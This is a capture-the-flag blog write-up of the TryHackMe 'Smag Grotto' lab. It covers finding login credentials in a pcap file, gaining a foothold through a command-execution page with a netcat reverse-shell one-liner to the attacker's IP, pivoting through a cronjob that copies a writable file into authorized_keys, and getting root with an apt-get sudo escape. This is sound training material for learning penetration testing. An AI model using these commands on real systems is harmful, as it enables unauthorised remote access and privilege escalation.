---
title: "TryHackMe - Smag Grotto"
author: Nasrallah
description: ""
date: 2022-12-11 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, wireshark, ssh-keygen, sudo, cronjob]
img_path: /assets/img/tryhackme/smaggrotto
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Smag Grotto](https://tryhackme.com/room/smaggrotto) from [TryHackMe](https://tryhackme.com). On a webpage we find a pcap file that contains credentials for a login page, we use them to login and find out we can run commands on the system so we use that to get a reverse shell. After that we exploit a cronjob running to escalate to another user on the system. A sudo entry then is used to get root.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.49.239
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 running OpenSSH and port 80 running Apache http web server.

## Web

Let's navigate to the web page.

![](1.png)

We see the welcome page of Smag informing us that the site in under development.

## Ffuf

Let's run a directory scan.

```terminal
└──╼ $ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://10.10.49.239/FUZZ                                                                        1 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.49.239/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 138ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 135ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 132ms]
                        [Status: 200, Size: 402, Words: 69, Lines: 13, Duration: 142ms]
index.php               [Status: 200, Size: 402, Words: 69, Lines: 13, Duration: 166ms]
mail                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 216ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 141ms]
:: Progress: [4614/4614] :: Job [1/1] :: 75 req/sec :: Duration: [0:01:10] :: Errors: 0 ::
```

We found a page called **page**, let's check it out.

![](2.png)

As expected, we see emails between the website's admins/developers, in one of the emails we see a pcap file, let's download it and inspect it using `wireshark`.

## Wireshark

![](3.png)

We can see a `POST` request to `login.php`, let's see the request's body by right clicking on it -> Follow -> HTTP stream.

![](4.png)

We found a username and password.

The `login.php` is located at `development.smag.thm`, let's add the domain and subdomain to our /etc/hosts file.

![](5.png)

Now let's navigate to `http://development.smag.thm/`.

![](6.png)

Let's go to the login page.

![](7.png)

Using the credentials we found in the pcap file, let's login.

![](8.png)

# **Foothold**

We can enter commands here, i tried some commands like `id` and `whoami` but didn't get any response, so i tried to get a reverse shell using the following command:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.0.188 9001 >/tmp/f
```

I setup a netcat listener, run the command and got the shell.

![](9.png)

# **Privilege Escalation**

After some enumeration, we check the crontab file and find the following:

```terminal
www-data@smag:/opt/.backups$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

There is a cronjob running every minute printing the content of `/opt/.backups/jake_id_rsa.pub.backup` to `/home/jake/.ssh/authorized_keys`.

Let's check the `jake_id_rsa.pub.backup` file.

![](10.png)

We can modify that file, so let's copy our own public key to it, wait a minute and try to connect as jake via ssh.

First, we generate a new key pair using `ssh-keygen`

![](11.png)

Now copy the public key to `jake_id_rsa.pub.backup` file.

![](13.png)

Now we wait a bit and connect as jake using our ssh private key.

![](14.png)

Great! Now let's check our current privileges with `sudo -l`.

```bash
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get

```

We see that we can run `apt-get` as root, let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/#sudo).

![](15.png)

We see three different ways to get root, but we'll use the 3rd one.

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```



---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
